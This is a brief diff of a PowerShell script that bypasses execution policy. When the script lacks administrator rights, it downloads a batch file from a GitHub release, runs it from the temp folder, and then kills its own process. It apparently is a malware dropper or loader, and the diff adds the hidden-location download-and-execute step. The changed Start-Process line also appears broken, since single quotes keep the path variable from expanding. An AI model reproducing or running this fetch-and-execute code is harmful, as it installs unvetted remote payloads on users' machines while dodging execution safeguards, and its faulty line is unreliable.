@@ -7,8 +7,9 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 $skid = "skid"
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "download.bat"
-    Start-Process -FilePath 'download.bat'
+    Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "$env:temp\download.bat"
+    Start-Process -FilePath '$env:temp\download.bat'
+    Stop-Process $pid -Force
 }
 
 $rdir = "C:\Users\hai1723"
